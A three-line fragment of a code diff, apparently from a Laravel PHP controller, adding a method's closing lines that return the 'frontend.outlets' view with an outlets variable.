+        return view("frontend.outlets", compact('outlets'));
+    }
+}
